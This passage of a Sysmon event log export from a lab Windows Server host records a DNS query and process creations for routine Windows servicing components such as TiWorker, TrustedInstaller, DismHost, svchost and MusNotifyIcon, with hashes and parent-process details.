UtcTime: 2026-05-28 08:57:39.273
ProcessGuid: {6e4a868b-0155-6a18-8900-000000002300}
ProcessId: 6120
QueryName: WIN-JOCP945SK51
QueryStatus: 0
QueryResults: ::1;::ffff:192.168.1.251;
Image: C:\Windows\System32\svchost.exe
User: NT AUTHORITY\LOCAL SERVICE"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"C:\Windows\System32\svchost.exe"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"{6e4a868b-0155-6a18-8900-000000002300}"	6120	" - "	" - "	"WIN-JOCP945SK51"	"::1;::ffff:192.168.1.251;"	0	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	"NT AUTHORITY\LOCAL SERVICE"	"2026-05-28 08:57:39.273"	" - "	" - "	22	" - "	Info	"3,216"	"4,140"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16426	"Dns query (rule: DnsQuery)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 11:56:44.273"	"ShDNbZ4ByrYY_kgLBHr1"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 11:56:44.847"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 08:56:44.267
ProcessGuid: {6e4a868b-034c-6a18-0401-000000002300}
ProcessId: 5012
Image: C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.17763.8754_none_56c5d8c199369b17\TiWorker.exe
FileVersion: 10.0.17763.8754 (WinBuild.160101.0800)
Description: Windows Modules Installer Worker
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: TiWorker.exe
CommandLine: C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.17763.8754_none_56c5d8c199369b17\TiWorker.exe -Embedding
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=E8E7C1A163D1EA507D8CC2FCD707FC78,SHA256=55B73781B087BF1622809F3458129026DA33849F2181E7538C625BA8A577503B,IMPHASH=1CBCFAF36C2AD99E911D299737C12477
ParentProcessGuid: {6e4a868b-012d-6a18-0e00-000000002300}
ParentProcessId: 888
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.17763.8754_none_56c5d8c199369b17\TiWorker.exe -Embedding"	"Microsoft Corporation"	"C:\Windows\system32\"	"Windows Modules Installer Worker"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.8754 (WinBuild.160101.0800)"	" - "	"MD5=E8E7C1A163D1EA507D8CC2FCD707FC78,SHA256=55B73781B087BF1622809F3458129026DA33849F2181E7538C625BA8A577503B,IMPHASH=1CBCFAF36C2AD99E911D299737C12477"	"C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.17763.8754_none_56c5d8c199369b17\TiWorker.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"TiWorker.exe"	"C:\Windows\system32\svchost.exe -k DcomLaunch -p"	"C:\Windows\System32\svchost.exe"	"{6e4a868b-012d-6a18-0e00-000000002300}"	888	"NT AUTHORITY\SYSTEM"	"{6e4a868b-034c-6a18-0401-000000002300}"	5012	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 08:56:44.267"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16425	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 11:56:44.233"	"SBDNbZ4ByrYY_kgLBHr1"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 11:56:44.847"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 08:56:44.228
ProcessGuid: {6e4a868b-034c-6a18-0301-000000002300}
ProcessId: 6108
Image: C:\Windows\servicing\TrustedInstaller.exe
FileVersion: 10.0.17763.8276 (WinBuild.160101.0800)
Description: Windows Modules Installer
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: TrustedInstaller.exe
CommandLine: C:\Windows\servicing\TrustedInstaller.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=DE9504487929A1EDB4C914055D53CFB2,SHA256=5DA778DCC4FD78BE879038A26DC44F021E6F1D49A814E2017C9AAAA4BB8FC76D,IMPHASH=892D11A64BAF1E8BBC19AF5CB650253F
ParentProcessGuid: {6e4a868b-012a-6a18-0b00-000000002300}
ParentProcessId: 640
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Windows\servicing\TrustedInstaller.exe"	"Microsoft Corporation"	"C:\Windows\system32\"	"Windows Modules Installer"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.8276 (WinBuild.160101.0800)"	" - "	"MD5=DE9504487929A1EDB4C914055D53CFB2,SHA256=5DA778DCC4FD78BE879038A26DC44F021E6F1D49A814E2017C9AAAA4BB8FC76D,IMPHASH=892D11A64BAF1E8BBC19AF5CB650253F"	"C:\Windows\servicing\TrustedInstaller.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"TrustedInstaller.exe"	"C:\Windows\system32\services.exe"	"C:\Windows\System32\services.exe"	"{6e4a868b-012a-6a18-0b00-000000002300}"	640	"NT AUTHORITY\SYSTEM"	"{6e4a868b-034c-6a18-0301-000000002300}"	6108	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 08:56:44.228"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16423	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 11:56:44.157"	"RxDNbZ4ByrYY_kgLBHr1"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 11:56:44.847"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 08:56:44.155
ProcessGuid: {6e4a868b-034c-6a18-0201-000000002300}
ProcessId: 7136
Image: C:\Windows\Temp\FA337069-C2CD-48AE-853D-B9F2DD4C073A\DismHost.exe
FileVersion: 10.0.17763.1697 (WinBuild.160101.0800)
Description: Dism Host Servicing Process
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: DismHost.exe
CommandLine: C:\Windows\TEMP\FA337069-C2CD-48AE-853D-B9F2DD4C073A\dismhost.exe {9DB5E6B2-5AAE-4DE9-A915-7C56A1F83352}
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=03F3504E45ACBB30F956A84E5C8DFA96,SHA256=2FB529DE54D39308398E59CC7FA5CAEF1ACF81A13BCCDD645950E7F88D3842E1,IMPHASH=C601FA732FF0599995A293BA7882B84D
ParentProcessGuid: {6e4a868b-034c-6a18-0001-000000002300}
ParentProcessId: 6212
ParentImage: C:\Windows\System32\wbem\WmiPrvSE.exe
ParentCommandLine: C:\Windows\system32\wbem\wmiprvse.exe -Embedding
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Windows\TEMP\FA337069-C2CD-48AE-853D-B9F2DD4C073A\dismhost.exe {9DB5E6B2-5AAE-4DE9-A915-7C56A1F83352}"	"Microsoft Corporation"	"C:\Windows\system32\"	"Dism Host Servicing Process"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.1697 (WinBuild.160101.0800)"	" - "	"MD5=03F3504E45ACBB30F956A84E5C8DFA96,SHA256=2FB529DE54D39308398E59CC7FA5CAEF1ACF81A13BCCDD645950E7F88D3842E1,IMPHASH=C601FA732FF0599995A293BA7882B84D"	"C:\Windows\Temp\FA337069-C2CD-48AE-853D-B9F2DD4C073A\DismHost.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"DismHost.exe"	"C:\Windows\system32\wbem\wmiprvse.exe -Embedding"	"C:\Windows\System32\wbem\WmiPrvSE.exe"	"{6e4a868b-034c-6a18-0001-000000002300}"	6212	"NT AUTHORITY\SYSTEM"	"{6e4a868b-034c-6a18-0201-000000002300}"	7136	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 08:56:44.155"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16422	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 11:56:43.138"	"ExDNbZ4ByrYY_kgLBHr1"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 11:56:43.828"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 08:56:43.135
ProcessGuid: {6e4a868b-034b-6a18-fd00-000000002300}
ProcessId: 7500
Image: C:\Windows\System32\svchost.exe
FileVersion: 10.0.17763.3346 (WinBuild.160101.0800)
Description: Host Process for Windows Services
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: svchost.exe
CommandLine: C:\Windows\System32\svchost.exe -k netsvcs -p
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69
ParentProcessGuid: {6e4a868b-012a-6a18-0b00-000000002300}
ParentProcessId: 640
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Windows\System32\svchost.exe -k netsvcs -p"	"Microsoft Corporation"	"C:\Windows\system32\"	"Host Process for Windows Services"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.3346 (WinBuild.160101.0800)"	" - "	"MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69"	"C:\Windows\System32\svchost.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"svchost.exe"	"C:\Windows\system32\services.exe"	"C:\Windows\System32\services.exe"	"{6e4a868b-012a-6a18-0b00-000000002300}"	640	"NT AUTHORITY\SYSTEM"	"{6e4a868b-034b-6a18-fd00-000000002300}"	7500	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 08:56:43.135"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16382	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 11:56:43.068"	"EhDNbZ4ByrYY_kgLBHr1"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 11:56:43.828"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 08:56:43.065
ProcessGuid: {6e4a868b-034b-6a18-fc00-000000002300}
ProcessId: 5932
Image: C:\Windows\System32\svchost.exe
FileVersion: 10.0.17763.3346 (WinBuild.160101.0800)
Description: Host Process for Windows Services
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: svchost.exe
CommandLine: C:\Windows\System32\svchost.exe -k netsvcs -p -s PushToInstall
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69
ParentProcessGuid: {6e4a868b-012a-6a18-0b00-000000002300}
ParentProcessId: 640
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Windows\System32\svchost.exe -k netsvcs -p -s PushToInstall"	"Microsoft Corporation"	"C:\Windows\system32\"	"Host Process for Windows Services"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.3346 (WinBuild.160101.0800)"	" - "	"MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69"	"C:\Windows\System32\svchost.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"svchost.exe"	"C:\Windows\system32\services.exe"	"C:\Windows\System32\services.exe"	"{6e4a868b-012a-6a18-0b00-000000002300}"	640	"NT AUTHORITY\SYSTEM"	"{6e4a868b-034b-6a18-fc00-000000002300}"	5932	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 08:56:43.065"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16381	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 11:56:42.776"	"ERDNbZ4ByrYY_kgLBHr1"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 11:56:43.828"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 08:56:42.775
ProcessGuid: {6e4a868b-034a-6a18-fa00-000000002300}
ProcessId: 7012
Image: C:\Windows\System32\MusNotifyIcon.exe
FileVersion: 10.0.17763.2989 (WinBuild.160101.0800)
Description: MusNotifyIcon.exe
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: MusNotifyIcon.exe
CommandLine: %%systemroot%%\system32\MusNotifyIcon.exe NotifyTrayIcon 0
CurrentDirectory: C:\Windows\system32\
User: LAB2019\Administrator
LogonGuid: {6e4a868b-015d-6a18-d703-070000000000}
LogonId: 0x703D7
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=18431EB15C8177E1FD431E37EB8C174B,SHA256=97DD4E1996EC4CA61C57476DEC67E29C46946595473769FF3151228284B56B24,IMPHASH=66347AB7C85B5A3E9B71FD6DE905ACEC
ParentProcessGuid: {6e4a868b-0144-6a18-7f00-000000002300}
ParentProcessId: 5428
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s UsoSvc
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"%%systemroot%%\system32\MusNotifyIcon.exe NotifyTrayIcon 0"	"Microsoft Corporation"	"C:\Windows\system32\"	"MusNotifyIcon.exe"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.2989 (WinBuild.160101.0800)"	" - "	"MD5=18431EB15C8177E1FD431E37EB8C174B,SHA256=97DD4E1996EC4CA61C57476DEC67E29C46946595473769FF3151228284B56B24,IMPHASH=66347AB7C85B5A3E9B71FD6DE905ACEC"	"C:\Windows\System32\MusNotifyIcon.exe"	" - "	High	"{6e4a868b-015d-6a18-d703-070000000000}"	0x703d7	"MusNotifyIcon.exe"	"C:\Windows\system32\svchost.exe -k netsvcs -p -s UsoSvc"	"C:\Windows\System32\svchost.exe"	"{6e4a868b-0144-6a18-7f00-000000002300}"	5428	"NT AUTHORITY\SYSTEM"	"{6e4a868b-034a-6a18-fa00-000000002300}"	7012	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	1	"LAB2019\Administrator"	"2026-05-28 08:56:42.775"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16380	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
